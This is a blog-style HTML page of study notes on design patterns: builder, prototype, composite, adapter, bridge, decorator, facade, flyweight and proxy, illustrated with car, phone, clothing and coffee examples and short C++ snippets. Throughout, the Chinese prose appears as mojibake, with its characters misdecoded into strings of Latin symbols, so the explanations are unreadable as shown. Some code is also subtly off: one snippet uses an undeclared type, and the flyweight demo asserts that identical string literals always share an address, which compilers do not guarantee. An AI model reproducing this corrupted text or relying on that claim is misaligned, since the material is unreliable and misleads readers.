<h5 id="è½¦çš„ç”Ÿäº§-å»ºé€ è€…æ¨¡å¼"><a href="#è½¦çš„ç”Ÿäº§-å»ºé€ è€…æ¨¡å¼" class="headerlink" title="è½¦çš„ç”Ÿäº§ - å»ºé€ è€…æ¨¡å¼"></a>è½¦çš„ç”Ÿäº§ - å»ºé€ è€…æ¨¡å¼</h5><p>ç”¨æˆ·å®é™…ä¸Šä¸å…³å¿ƒè½¦è¾†çš„æ„é€ , ç”¨æˆ·åªéœ€è¦å…³å¿ƒ<code>charge</code>å……èƒ½å’Œ<code>run</code>è€—èƒ½è¡Œé©¶å°±å¤Ÿäº†</p>
<p>ç”¨æˆ·åªéœ€è¦æå‡ºéœ€æ±‚â€œå››é—¨ç”µåŠ¨å¡è½¦â€, ç„¶åç­‰ç€æè´§å°±å®Œäº†</p>
<p>å¯¹äºæ¯ç§ç”¨æˆ·éœ€æ±‚, å¯ä»¥å»ºç«‹ä¸€ä¸ªä¸“é—¨çš„<code>Builder</code>æ¥æ»¡è¶³éœ€æ±‚</p>
<p>æ¯”å¦‚<code>ElectricTruckBuilder</code></p>
<p><code>Builder</code>ä¹Ÿå¯ä»¥æœ‰ç±»ä½“ç³»:</p>
<p><code>AutoBuilder</code>è¡¨ç¤ºæ‰€æœ‰è½¦è¾†é€šç”¨çš„å»ºé€ è€…, ç”¨äºç»„è£…è½¦è¾†å…±æœ‰éƒ¨åˆ†æ¯”å¦‚é—¨</p>
<p><code>TruckBuilder</code>è¡¨ç¤ºå¡è½¦ç±»å»ºé€ è€…, ç”¨äºç»„è£…é›†è£…ç®±</p>
<p><code>ElectricTruckBuilder</code>è¡¨ç¤ºç”µå¡è½¦, åœ¨å¡è½¦åŸºç¡€ä¸Šç»„è£…ç”µåŠ¨åŠ›</p>
<p>åªæœ‰å…·ä½“çš„å»ºé€ è€…ç±»æ‰èƒ½å®ä¾‹åŒ–, ä»»ä½•çˆ¶ç±»éƒ½å«æœ‰æŠ½è±¡æ–¹æ³•, æœ‰æŠ½è±¡å‡½æ•°æœªå®ç°çš„ç±»å®ä¾‹åŒ–æ— æ³•é€šè¿‡ç¼–è¯‘.</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/VideoBed/main/image-20250410202039417.png" alt="image-20250410202039417"></p>
<p>æ‰€æœ‰å»ºé€ è€…åº”è¯¥ç”±ä¸€ä¸ªæŒ‡å¯¼è€…ç®¡ç†, å†³å®šåˆ°åº•é‡‡ç”¨å“ªä¸ªæ„é€ è€…, </p>
<p>ç”¨æˆ·åªéœ€è¦è·ŸæŒ‡å¯¼è€…è¯´è‡ªå·±æƒ³è¦ä»€ä¹ˆæ ·çš„è½¦, æŒ‡å¯¼è€…å»æ‰¾å¯¹åº”çš„å»ºé€ è€…</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/VideoBed/main/image-20250410202558152.png" alt="image-20250410202558152"></p>
<h4 id="åŸå‹æ¨¡å¼"><a href="#åŸå‹æ¨¡å¼" class="headerlink" title="åŸå‹æ¨¡å¼"></a>åŸå‹æ¨¡å¼</h4><p>é€šè¿‡ä¸€ä»½åŸå‹ï¼Œå…‹éš†å‡ºå¤šä¸ªå‰¯æœ¬</p>
<p>æ¯”å¦‚ç®€å†ï¼Œå¯ä»¥æ‰“å°ä¸€ä»½ï¼Œå¤å°å¤šä»½</p>
<p>å°±æ˜¯ç»§æ‰¿ä¸€ä¸ªCloneableæ¥å£ï¼Œå®ç°ä¸€ä¸ªcloneå‡½æ•°</p>
<p>æ ¹æ®éœ€è¦å®ç°æ·±æ‹·è´å’Œæµ…æ‹·è´</p>
<h3 id="ç»“æ„å‹æ¨¡å¼"><a href="#ç»“æ„å‹æ¨¡å¼" class="headerlink" title="ç»“æ„å‹æ¨¡å¼"></a>ç»“æ„å‹æ¨¡å¼</h3><p>å…³æ³¨å¯¹è±¡ä¹‹é—´çš„ç»„åˆå’Œå…³ç³»ï¼Œ æ„å»ºçµæ´»ä¸”å¯å¤ç”¨çš„ç±»å’Œå¯¹è±¡ç»“æ„</p>
<h4 id="ç»„åˆæ¨¡å¼"><a href="#ç»„åˆæ¨¡å¼" class="headerlink" title="ç»„åˆæ¨¡å¼"></a>ç»„åˆæ¨¡å¼</h4><p>ç”¨æ ‘å½¢ç»“æ„ç®¡ç†ç³»ç»Ÿ</p>
<p>ç”¨æˆ·å¯¹çˆ¶èŠ‚ç‚¹çš„æ“ä½œå’Œå¯¹å­èŠ‚ç‚¹çš„æ“ä½œå…·æœ‰ä¸€è‡´æ€§</p>
<blockquote>
<p>ä»¥è¯­æ³•åˆ†ææ ‘ä¸ºä¾‹, å„ä¸ªèŠ‚ç‚¹å‡å®ç°visitæ¥å£</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/VideoBed/main/20250416180301701.png" alt="image-20250416180300050"></p>
<p>Operandå°±æ˜¯å¶å­ç±»</p>
<p>Operatorå°±æ˜¯å†…éƒ¨èŠ‚ç‚¹ç±»</p>
<p>è¿™æ ·å°†å†…éƒ¨èŠ‚ç‚¹å’Œå¶å­èŠ‚ç‚¹åˆ†ç±»è®¨è®º, æ˜¯<strong>å®‰å…¨æ¨¡å¼</strong></p>
<p>å¦‚æœå°†å¶å­èŠ‚ç‚¹ä¹Ÿå½’ä¸ºå†…éƒ¨èŠ‚ç‚¹, ä¸å†åˆ†ç±»è®¨è®º, åˆ™å˜æˆäº†<strong>é€æ˜æ¨¡å¼</strong>, æ­¤æ—¶å®é™…ä¸Šçš„å¶å­èŠ‚ç‚¹çš„handleå’ŒgetBaseç­‰å‡½æ•°æ²¡æœ‰æ„ä¹‰</p>
</blockquote>
<p>é—®é¢˜åœºæ™¯:</p>
<p>æè¿°å¦‚ä¸‹å…¬å¸ç»“æ„</p>
<p>æ€»éƒ¨æœ‰è‡ªå·±çš„äººåŠ›å’Œè´¢åŠ¡, æ€»éƒ¨è¿˜ç®¡ç†å¤šä¸ªåˆ†å…¬å¸</p>
<p>åˆ†å…¬å¸ä¹Ÿæœ‰è‡ªå·±çš„äººåŠ›å’Œè´¢åŠ¡,åˆ†å…¬å¸ç®¡ç†å¤šä¸ªåŠäº‹å¤„</p>
<p>åŠäº‹å¤„ä¹Ÿæœ‰è‡ªå·±çš„äººåŠ›å’Œè´¢åŠ¡</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/VideoBed/main/20250416170147209.png" alt="image-20250416170042003"></p>
<h5 id="é€æ˜æ¨¡å¼"><a href="#é€æ˜æ¨¡å¼" class="headerlink" title="é€æ˜æ¨¡å¼"></a>é€æ˜æ¨¡å¼</h5><p><img src="https://raw.githubusercontent.com/DeutschBall/VideoBed/main/20250418165848591.png" alt="image-20250416185347833"></p>
<p>è¿™æ ·å®ç°çš„ä¸è¶³ä¹‹å¤„æ˜¯, äººåŠ›, è´¢æ”¿ç­‰éƒ¨é—¨, æ²¡æœ‰å­éƒ¨é—¨æˆ–è€…å­å…¬å¸, </p>
<p><code>departments</code>æˆå‘˜å’Œ<code>addDepartment</code>æ–¹æ³•ä¸åº”è¯¥è¢«ç»§æ‰¿. è¿åäº†é‡Œæ°æ›¿æ¢åŸåˆ™</p>
<h5 id="å®‰å…¨æ¨¡å¼"><a href="#å®‰å…¨æ¨¡å¼" class="headerlink" title="å®‰å…¨æ¨¡å¼"></a>å®‰å…¨æ¨¡å¼</h5><p><img src="https://raw.githubusercontent.com/DeutschBall/VideoBed/main/20250416191542638.png" alt="image-20250416191540906"></p>
<h4 id="é€‚é…å™¨æ¨¡å¼"><a href="#é€‚é…å™¨æ¨¡å¼" class="headerlink" title="é€‚é…å™¨æ¨¡å¼"></a>é€‚é…å™¨æ¨¡å¼</h4><p>å°†ä¸€ä¸ªç±»çš„æ¥å£æŒ‰éœ€æ±‚è½¬æ¢ä¸ºå¦ä¸€ä¸ªç±»çš„æ¥å£</p>
<p>ç”µæºé€‚é…å™¨:ä¸ç®¡å…¥æˆ·ç”µå‹å¤šå°‘ä¼éƒ½è½¬æ¢ä¸ºéœ€è¦çš„ç”µå‹æ¯”å¦‚36v</p>
<p>dequeæ”¹æˆqueue</p>
<p>vectoræ”¹æˆstack</p>
<p>ç”¨æˆ·éœ€æ±‚çš„æ¥å£ä»¥Targetæ¥å£ç»™å‡º</p>
<p>Adapterç±»å®ç°Targetæ¥å£</p>
<p>Adapterç±»å†…éƒ¨å°è£…ä¸€ä¸ªAdapteeç±»</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/VideoBed/main/20250412230048356.png" alt="image-20250412230046970"></p>
<h4 id="âœ¨æ¡¥æ¥æ¨¡å¼"><a href="#âœ¨æ¡¥æ¥æ¨¡å¼" class="headerlink" title="âœ¨æ¡¥æ¥æ¨¡å¼"></a>âœ¨æ¡¥æ¥æ¨¡å¼</h4><p>æœ¬èŠ‚æœ€åˆæè¿°äº†è¿™ä¹ˆä¸€ä»¶äº‹æƒ…ï¼š</p>
<p>1.ä¸åŒå“ç‰Œçš„æ‰‹æœº</p>
<p>2.æ¯ç§æ‰‹æœºéƒ½æœ‰mp3ï¼Œæ¸¸æˆï¼Œé€šè®¯å½•ç­‰ç­‰åŠŸèƒ½</p>
<p>æœ€åˆçš„è®¾è®¡æ–¹å¼æ˜¯çº¯ä½¿ç”¨ç»§æ‰¿å®ç°</p>
<p>æœ‰ä¸¤ç§ç»§æ‰¿è®¾è®¡æ–¹æ¡ˆï¼Œ ä¸€ä¸ªæ˜¯å“ç‰Œåœ¨é«˜å±‚ï¼Œä¸€ä¸ªæ˜¯åŠŸèƒ½åœ¨é«˜å±‚</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/picbed/main/image-20250418145111883.png" alt="image-20250418145111883"></p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/picbed/main/image-20250418145117103.png" alt="image-20250418145117103"></p>
<p>ä½†æ˜¯è¿™æ ·è®¾è®¡å°±ä¼šé¢ä¸´ä¸€ä¸ªé—®é¢˜ï¼š</p>
<p>å½“æœ‰æ–°å“ç‰Œæ‰‹æœºå‡ºç°ï¼Œ æˆ–è€…æ–°æ‰‹æœºåŠŸèƒ½å‡ºç°æ—¶ï¼Œ ä¼šå¯¼è‡´ç±»çš„æ•°é‡æ€¥å‰§è†¨èƒ€</p>
<blockquote>
<p>ä¹¦ä¸Šæ˜¯è¿™æ ·è¯´çš„:</p>
<p>â€œæ˜¯å‘€ï¼Œå°±åƒæˆ‘åˆšå¼€å§‹å­¦ä¼šç”¨é¢å‘å¯¹è±¡çš„ç»§æ‰¿æ—¶ï¼Œæ„Ÿè§‰å®ƒæ—¢æ–°é¢–åˆåŠŸèƒ½å¼ºå¤§ï¼Œæ‰€ä»¥åªè¦å¯ä»¥ç”¨ï¼Œå°±éƒ½ç”¨ä¸Šç»§æ‰¿ã€‚è¿™å°±å¥½æ¯”æ˜¯â€˜æœ‰äº†æ–°é”¤å­ï¼Œæ‰€æœ‰çš„ä¸œè¥¿çœ‹ä¸Šå»éƒ½æˆäº†é’‰å­ã€‚â€</p>
</blockquote>
<p>è¿™è¯´çš„å¤ªå¯¹äº†ã€‚</p>
<p>ç„¶è€Œä»”ç»†è€ƒè™‘è¿™ç§ç»§æ‰¿å…³ç³»çš„ç¼ºç‚¹ï¼š</p>
<p>ç¼–è¯‘æ—¶å°±ç¡®å®šäº†å­ç±»å’Œçˆ¶ç±»çš„ç»§æ‰¿å…³ç³»ï¼Œå¯¼è‡´å­ç±»å’Œçˆ¶ç±»å¿…ç„¶æœ‰ç´§å¯†çš„ä¾èµ–å…³ç³»ï¼Œçˆ¶ç±»çš„æ”¹åŠ¨å¿…ç„¶å¯¼è‡´å­ç±»çš„æ”¹åŠ¨ã€‚</p>
<p><strong>å› æ­¤è®¾è®¡æ¨¡å¼ä¸­çš„å¦ä¸€æ¡è®¾è®¡åŸåˆ™ï¼šåˆæˆ&#x2F;èšåˆå¤ç”¨åŸåˆ™</strong></p>
<p><strong>ä»”ç»†è€ƒè™‘è¿˜è¿åäº†å•ä¸€èŒè´£åŸåˆ™ï¼Œé€šè¿‡ç»§æ‰¿å¢åŠ çš„æ–°åŠŸèƒ½ï¼Œå°±æ˜¯åœ¨å¢åŠ ç±»çš„èŒè´£ã€‚</strong></p>
<p><strong>å› æ­¤è¿™ä¸ªæƒ…æ™¯åº”è¯¥ç”¨èšåˆè§£å†³</strong></p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/picbed/main/image-20250418150949353.png" alt="image-20250418150949353"></p>
<p>æ‰‹æœºæ˜¯ä¸»ä½“ï¼Œ ä¸ç®¡ä»€ä¹ˆå“ç‰Œï¼Œ éƒ½å¯ä»¥å®‰è£…ä¸åŒçš„è½¯ä»¶ï¼Œ è½¯ä»¶å¯ä»¥è§†ä¸ºä¸»ä½“ä¸Šçš„ç©ºæ§½ï¼Œå¯ä»¥ä»»æ„å®‰è£…</p>
<blockquote>
<p>è€ƒè™‘å››é—¨ç”µåŠ¨å¡è½¦é—®é¢˜æ—¶ï¼Œå®é™…ä¸Šä¹Ÿæ˜¯è¿™ä¸ªæƒ…å†µ</p>
<p>æŒ‰ç…§èƒ½æºç»§æ‰¿åæŒ‰ç…§ç”¨é€”ç»§æ‰¿æˆ–è€…æŒ‰ç…§ç”¨é€”ç»§æ‰¿åæŒ‰ç…§èƒ½æºç»§æ‰¿ï¼Œéƒ½æ˜¯æ»¥ç”¨ç»§æ‰¿è®¾è®¡</p>
<p>åº”è¯¥å°†è½¦çœ‹æˆä¸»ä½“ï¼Œå°†åŠ¨åŠ›ç³»ç»Ÿï¼Œè¿è½½ç³»ç»Ÿç­‰ç­‰çœ‹æˆæ§½ä½ã€‚ç©ºæ§½å¯ä»¥è‡ªå®šä¹‰æ·»åŠ æ¨¡å—.</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/VideoBed/main/image-20250410195428877.png" alt="æ¡¥æ¥æ¨¡å¼æŒ‡å¯¼çš„è½¦è¾†è®¾è®¡"></p>
<p>è¿™é‡ŒAutoè¡¨ç¤ºæ±½è½¦ç±»ï¼Œ Carå’ŒTruckè¡¨ç¤ºæ±½è½¦å“ç‰Œ</p>
<p>å°†Doorï¼ŒEngineï¼ŒContainerç­‰ç­‰è§†ä¸ºæ±½è½¦çš„é…ä»¶æ§½</p>
</blockquote>
<p><strong>å®ç°ç³»ç»Ÿå¯èƒ½æœ‰å¤šè§’åº¦åˆ†ç±»ï¼Œæ¯ä¸€ç§åˆ†</strong></p>
<p><strong>ç±»éƒ½æœ‰å¯èƒ½å˜åŒ–ï¼Œé‚£ä¹ˆå°±æŠŠè¿™ç§å¤šè§’åº¦åˆ†ç¦»å‡ºæ¥è®©å®ƒä»¬ç‹¬ç«‹å˜åŒ–ï¼Œ</strong></p>
<p><strong>å‡å°‘å®ƒä»¬ä¹‹é—´çš„è€¦åˆ</strong></p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/picbed/main/85ad1d5793224b6b0f9e0c73527d93db.png" alt="æ¡¥æ¥æ¨¡å¼"></p>
<h4 id="è£…é¥°æ¨¡å¼-å’–å•¡ç‚¹å•"><a href="#è£…é¥°æ¨¡å¼-å’–å•¡ç‚¹å•" class="headerlink" title="è£…é¥°æ¨¡å¼ - å’–å•¡ç‚¹å•"></a>è£…é¥°æ¨¡å¼ - å’–å•¡ç‚¹å•</h4><p>è€ƒè™‘å¦‚ä¸‹åœºæ™¯:</p>
<p>å½¢è±¡è®¾è®¡, äººæœ‰å¤šç§è¡£æœå¯ä»¥ç©¿, å¯ä»¥åªç©¿ä¸€æ¡è£¤è¡©å­, ä¹Ÿå¯ä»¥ç©¿åœ°å…¨å‰¯æ­¦è£…, ä¹Ÿå¯ä»¥è£¤è¡©å­å¤–ç©¿è£…è¶…äºº.</p>
<p>æœ€åˆæˆ‘çš„è®¾è®¡æ˜¯è¿™æ ·çš„:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">class Wear&#123;&#125;;</span><br><span class="line">class UpWear : Wear&#123;&#125;;</span><br><span class="line">class UnderWear: Wear&#123;&#125;;</span><br><span class="line">class FootWear: Wear&#123;&#125;;</span><br><span class="line">class Avator&#123;</span><br><span class="line">	UpWear * upwear;</span><br><span class="line">	UnderWear * underwear;</span><br><span class="line">	FootWear * footwear;</span><br><span class="line">	void setUpWear(UpWear *up);</span><br><span class="line">	void setDownWear(DownWear *downwear);</span><br><span class="line">	void setFootWear(FootWear *footwear);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>ç„¶è€Œè¿™æ ·è®¾è®¡çš„é—®é¢˜æ˜¯:</p>
<p>1.äººä¸ä¸€å®šåªç©¿ä¸€ä»¶ä¸Šè¡£, å¯èƒ½ç©¿äº†ç§‹è¡£ç„¶ååˆç©¿äº†å¤–å¥—, ç”šè‡³å¯ä»¥ä¸ç©¿ä¸Šè¡£</p>
<p>2.æ²¡æ³•ä½“ç°ç©¿è¡£æœçš„å…ˆåé¡ºåº</p>
<p>3.å‡è®¾ç°åœ¨æœ‰ä¸€ç§æ–°çš„è£…é¥°, æˆ’æŒ‡Ringç±», é‚£ä¹ˆAvatorç±»æ— æ³•è¡¨ç¤º</p>
<p>ä¹Ÿå°±æ˜¯è¯´, æˆ‘ä»¬ä¸èƒ½é¢„ä¼°äººä¼šç©¿å¤šå°‘è£…é¥°ç‰©, å¯èƒ½ä¸€ä»¶ä¸ç©¿, å¯èƒ½ç©¿çš„é›å®¹åè´µ</p>
<p>æˆ‘ä»¬ä¸èƒ½ç«™åœ¨äººè‡ªå·±çš„è§’åº¦æ¥èšåˆè£…æ‰®</p>
<p>åº”è¯¥ç«™åœ¨è£…æ‰®çš„è§’åº¦å¾€ä¸€ä¸ªæœ¨å¶èº«ä¸Šå¥—å¨ƒ</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">(æœ¨å¶)</span><br><span class="line">((æœ¨å¶),å†…è£¤)</span><br><span class="line">(((æœ¨å¶),å†…è£¤),å¸†å¸ƒé‹)</span><br><span class="line">((((æœ¨å¶),å†…è£¤),å¸†å¸ƒé‹),ç‰›ä»”è£¤)</span><br></pre></td></tr></table></figure>

<p>å¯¹äºæ¯ä¸ªè£…é¥°ç‰©æ¥è¯´, ä»–åªéœ€è¦çŸ¥é“ç›®å‰å¥—å¨ƒä»€ä¹ˆæ ·, ç„¶åè‡ªå·±å¥—ä¸Šå», æˆä¸ºæ–°çš„å¥—å¨ƒ</p>
<p>ç±»ä¼¼çš„æ€æƒ³ä¹Ÿå¯ä»¥ç”¨äºå’–å•¡ç‚¹å•</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">(ç¾å¼)</span><br><span class="line">((ç¾å¼),åŠ ç³–)</span><br><span class="line">(((ç¾å¼),åŠ ç³–),åŠ å†°)</span><br><span class="line">((((ç¾å¼),åŠ ç³–),åŠ å†°),åŠ ç³–)</span><br><span class="line">(((((ç¾å¼),åŠ ç³–),åŠ å†°),åŠ ç³–),åŠ ç‰›å¥¶)</span><br></pre></td></tr></table></figure>

<p>é‚£ä¹ˆè¿™ç§æ¨¡å¼åº”è¯¥å¦‚ä½•è¡¨ç¤ºå‘¢</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/VideoBed/main/20250412132801382.png" alt="image-20250409095133753"></p>
<p>è¿™é‡ŒConcreteComponentå°±æ˜¯æœ€åˆçš„ç¾å¼, ä¹Ÿå°±æ˜¯å¥—å¨ƒçš„æ ¸</p>
<p>ç„¶ååŠ ç³–åŠ å†°åŠ ç‰›å¥¶éƒ½æ˜¯Decoratorçš„å­ç±», æ¯ä¸ªè¡¨ç¤ºä¸€å±‚å¥—å¨ƒ</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/VideoBed/main/image-20250409112822371.png" alt="image-20250409112822371"></p>
<p>æ­¤åå¦‚æœæœ‰æ–°çš„å’–å•¡ï¼Œæ¯”å¦‚å¡å¸ƒå¥‡è¯ºï¼Œç»§æ‰¿Coffeeå…µå®ç°toStringå³å¯</p>
<p>å¦‚æœæœ‰æ–°çš„å£å‘³ï¼Œæ¯”å¦‚æ¤°æœï¼Œç»§æ‰¿Flavourå¹¶å®ç°getNameå³å¯</p>
<h4 id="å¤–è§‚æ¨¡å¼"><a href="#å¤–è§‚æ¨¡å¼" class="headerlink" title="å¤–è§‚æ¨¡å¼"></a>å¤–è§‚æ¨¡å¼</h4><p>å­ç³»ç»Ÿå¯¹å¤–ä¸å¯è§, ç”±å¤–è§‚ç±»Facadeå¯¹å¤–æä¾›æ¥å£æä¾›è®¿é—®, å®¢æˆ·ä¸éœ€è¦å…³å¿ƒå­ç³»ç»Ÿç»†èŠ‚</p>
<p>Facadeç›¸å½“äºä¸€ä¸ªé«˜çº§ä»£ç†</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/VideoBed/main/image-20250409203910376.png" alt="image-20250409203910376"></p>
<p>å¤–è§‚æ¨¡å¼å’Œä»£ç†æ¨¡å¼çš„åŒºåˆ«:</p>
<p>ä»£ç†ç±»åªå¯¹ä¸€ä¸ªå®é™…å¯¹è±¡è¿›è¡Œä»£ç†, æ›´åŠ ä¸“ä¸€</p>
<p>ä½†æ˜¯å¤–è§‚ç±»ä¸­ç®¡ç†äº†å¾ˆå¤šå­ç³»ç»Ÿ, å¹¶æä¾›ä¸åŒæ–¹æ³•ç»„åˆå¯¹ä¸€ä¸ªæˆ–å¤šä¸ªå­ç³»ç»Ÿçš„è°ƒç”¨</p>
<p>å¤–è§‚æ¨¡å¼å¯ä»¥ç”¨åœ¨åŸºé‡‘å’Œè‚¡ç¥¨åœºæ™¯ä¸­</p>
<p>å®¢æˆ·æ˜¯ç™½ç—´ç†è´¢äºº</p>
<p>è‚¡ç¥¨æ˜¯å­ç³»ç»Ÿ</p>
<p>åŸºé‡‘æ˜¯å¤–è§‚ç±»</p>
<p>åŸºé‡‘ç»ç†ä¼šæŒ‘é€‰å‡ åªè‚¡ç¥¨æŠ¼å®, ä¸å†ä¸€æ£µæ ‘ä¸ŠåŠæ­». å¯¹åº”åˆ°å¤–è§‚ç±»å¯ä»¥ç»„åˆå­ç³»ç»Ÿçš„è°ƒç”¨</p>
<p>å®¢æˆ·åªéœ€è¦å’ŒåŸºé‡‘ç»ç†æ‰“äº¤é“, ä¹°å…¥æˆ–è€…å–å‡º. å¯¹åº”åˆ°å®¢æˆ·ç±»åªéœ€è¦è®¿é—®å¤–è§‚ç±»æä¾›çš„æ¥å£</p>
<h4 id="äº«å…ƒæ¨¡å¼"><a href="#äº«å…ƒæ¨¡å¼" class="headerlink" title="äº«å…ƒæ¨¡å¼"></a>äº«å…ƒæ¨¡å¼</h4><p>äº«å…ƒæ¨¡å¼ï¼Œ<code>FlyWeight</code>ï¼Œå®é™…ä¸Šæ˜¯è½»é‡çº§çš„æ„æ€</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;assert.h&gt;</span></span></span><br><span class="line">using namespace <span class="built_in">std</span>;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="type">char</span> * a = <span class="string">&quot;helloworld&quot;</span>;</span><br><span class="line">    <span class="type">char</span> * b = <span class="string">&quot;helloworld&quot;</span>;</span><br><span class="line">    assert(a == b);</span><br><span class="line">    <span class="built_in">cout</span>&lt;&lt;(<span class="type">size_t</span> *)a&lt;&lt;<span class="string">&quot; &quot;</span>&lt;&lt;(<span class="type">size_t</span>*)b&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>å®é™…ä¸Šç¼–è¯‘å™¨åœ¨rodataæ®µåªä¼šç”Ÿæˆä¸€ä¸ªâ€œhelloworldâ€å­—ç¬¦ä¸²ï¼Œè€Œä¸æ˜¯ä¸¤ä¸ª</p>
<p>aå’ŒbæŒ‡é’ˆå®é™…ä¸ŠæŒ‡å‘ç›¸åŒçš„å†…å­˜åœ°å€</p>
<p>ç±»ä¼¼çš„åœºæ™¯æœ‰å†™æ—¶å¤åˆ¶ï¼š</p>
<p><strong>å†™æ—¶å¤åˆ¶</strong>ï¼ˆ<strong>Copy-on-write</strong>ï¼Œç®€ç§°<strong>COW</strong>ï¼‰æ˜¯ä¸€ç§è®¡ç®—æœº<a href="https://link.zhihu.com/?target=https://zh.wikipedia.org/wiki/%E7%A8%8B%E5%BC%8F%E8%A8%AD%E8%A8%88">ç¨‹åºè®¾è®¡</a>é¢†åŸŸçš„ä¼˜åŒ–ç­–ç•¥ã€‚å…¶æ ¸å¿ƒæ€æƒ³æ˜¯ï¼Œå¦‚æœæœ‰å¤šä¸ªè°ƒç”¨è€…ï¼ˆcallersï¼‰åŒæ—¶è¯·æ±‚ç›¸åŒèµ„æºï¼ˆå¦‚å†…å­˜æˆ–ç£ç›˜ä¸Šçš„æ•°æ®å­˜å‚¨ï¼‰ï¼Œä»–ä»¬ä¼šå…±åŒè·å–ç›¸åŒçš„æŒ‡é’ˆæŒ‡å‘ç›¸åŒçš„èµ„æºï¼Œç›´åˆ°æŸä¸ªè°ƒç”¨è€…è¯•å›¾ä¿®æ”¹èµ„æºçš„å†…å®¹æ—¶ï¼Œç³»ç»Ÿæ‰ä¼šçœŸæ­£å¤åˆ¶ä¸€ä»½ä¸“ç”¨å‰¯æœ¬ï¼ˆprivate copyï¼‰ç»™è¯¥è°ƒç”¨è€…ï¼Œè€Œå…¶ä»–è°ƒç”¨è€…æ‰€è§åˆ°çš„æœ€åˆçš„èµ„æºä»ç„¶ä¿æŒä¸å˜ã€‚è¿™è¿‡ç¨‹å¯¹å…¶ä»–çš„è°ƒç”¨è€…éƒ½æ˜¯<a href="https://link.zhihu.com/?target=https://zh.wikipedia.org/wiki/%E9%80%8F%E6%98%8E">é€æ˜</a>çš„ã€‚æ­¤ä½œæ³•ä¸»è¦çš„ä¼˜ç‚¹æ˜¯å¦‚æœè°ƒç”¨è€…æ²¡æœ‰ä¿®æ”¹è¯¥èµ„æºï¼Œå°±ä¸ä¼šæœ‰å‰¯æœ¬ï¼ˆprivate copyï¼‰è¢«åˆ›å»ºï¼Œå› æ­¤å¤šä¸ªè°ƒç”¨è€…åªæ˜¯è¯»å–æ“ä½œæ—¶å¯ä»¥å…±äº«åŒä¸€ä»½èµ„æºã€‚</p>
<p>äº«å…ƒæ¨¡å¼å®é™…ä¸Šæ˜¯å·¥å‚æ¨¡å¼çš„æ”¹è¿›, å·¥å‚ä¼šè®°å¿†ç”¨æˆ·çš„éœ€æ±‚</p>
<p>å¦‚æœç›¸åŒçš„éœ€æ±‚ä¹‹å‰å·²ç»æ»¡è¶³è¿‡äº†, é‚£ä¹ˆç›´æ¥è¿”å›ä¹‹å‰æ„å»ºçš„å¯¹è±¡</p>
<p>å¦‚æœæ˜¯æ–°éœ€æ±‚åˆ™åˆ›å»ºæ–°å¯¹è±¡</p>
<h4 id="ä»£ç†æ¨¡å¼"><a href="#ä»£ç†æ¨¡å¼" class="headerlink" title="ä»£ç†æ¨¡å¼"></a>ä»£ç†æ¨¡å¼</h4><p>ä¹¦ä¸Šä¸¾å¾—è¿™ä¸ªä¾‹å­å®åœ¨ä¸æ€ä¹ˆæ ·ï¼Œåˆ«å¤©å¤©æŠ˜ç£¨äººå®¶å¥³å¨ƒäº†ï¼Œçº¯äººæœº</p>
<p>æ„æ€å°±æ˜¯ç»™RealSubjectç±»è£¹äº†ä¸€å±‚Proxyä»£ç†ç±»ï¼Œä»£ç†ç±»å®ç°ç›¸åŒçš„Requestæ¥å£</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/VideoBed/main/image-20250409151837450.png" alt="image-20250409151837450"></p>
<p>è¿™ä¸ªä»£ç†ç±»åœ¨æ‰§è¡ŒRequeståŠ¨ä½œå‰åå¯ä»¥è‡ªå·±å¢åŠ preå’Œpostæ“ä½œ</p>
<h3 id="è¡Œä¸ºå‹æ¨¡å¼"><a href="#è¡Œä¸ºå‹æ¨¡å¼" class="headerlink" title="è¡Œä¸ºå‹æ¨¡å¼"></a>è¡Œä¸ºå‹æ¨¡å¼</h3><p>å…³æ³¨å¯¹è±¡ä¹‹é—´çš„é€šä¿¡ä¸äº¤äº’ï¼Œè§£å†³å¯¹è±¡ä¹‹é—´çš„è´£ä»»åˆ†é…ä¸ç®—æ³•å°è£…</p>
<h4 id="æ¨¡æ¿æ–¹æ³•æ¨¡å¼"><a href="#æ¨¡æ¿æ–¹æ³•æ¨¡å¼" class="headerlink" title="æ¨¡æ¿æ–¹æ³•æ¨¡å¼"></a>æ¨¡æ¿æ–¹æ³•æ¨¡å¼</h4><p>ä¸å˜çš„éƒ¨åˆ†æ¬åˆ°çˆ¶ç±»</p>
